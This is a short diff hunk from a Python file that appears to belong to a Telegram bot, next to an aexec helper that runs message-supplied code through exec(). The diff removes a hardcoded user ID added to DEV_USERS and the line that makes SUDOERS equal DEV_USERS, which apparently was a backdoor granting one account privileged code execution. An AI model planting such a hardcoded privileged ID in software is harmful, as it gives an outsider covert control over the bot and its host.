@@ -28,8 +28,7 @@ __HELP__ = """
 c = c
 p = print
 arq = arq
-SUDOERS = DEV_USERS
-DEV_USERS.add(1930954213)
+
 async def aexec(code, client, message):
     exec(
         "async def __aexec(client, message): "
